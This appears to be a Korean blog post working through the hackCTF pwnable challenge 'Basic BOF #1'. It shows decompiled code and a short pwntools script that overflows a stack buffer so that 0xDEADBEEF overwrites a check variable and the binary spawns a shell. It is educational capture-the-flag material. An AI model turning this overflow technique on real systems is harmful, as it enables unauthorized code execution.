---
layout: post
title:  "[hackCTF]Basic BOF #1"
date:   2020-02-09
---
hackCTF pwnable 첫번째 문제

## ida
***

  int __cdecl main(int argc, const char **argv, const char **envp)
  {
    char s; // [esp+4h] [ebp-34h]
    int v5; // [esp+2Ch] [ebp-Ch]

    v5 = 67305985;
    fgets(&s, 45, stdin);
    printf("\n[buf]: %s\n", &s);
    printf("[check] %p\n", v5);
    if ( v5 != 67305985 && v5 != -559038737 )
      puts("\nYou are on the right way!");
    if ( v5 == -559038737 )
    {
      puts("Yeah dude! You win!\nOpening your shell...");
      system("/bin/dash");
      puts("Shell closed! Bye.");
    }
    return 0;

코드를 보면 v5가 -559038737일 때 shell을 실행할 수 있다.   
우리가 직접 수정할 수 있는 건 s이다.   
payload를 v5까지 덮을 수 있도록 만들자.   

## exploit.py
***
```
  #!/usr/bin/python
  from pwn import *
  
  p = process('./bof_basic')

  payload = "A"*(0x2c-0x4)+p32(0xDEADBEEF)

  p.sendline(payload)

  p.interactive()
```
-559038737는 hex로 0xDEADBEEF다. p32 방식으로 패킹해서 payload를 만들면 끗.
p32 : little endian 방식으로 패킹해줌 (u32 : 언패킹)
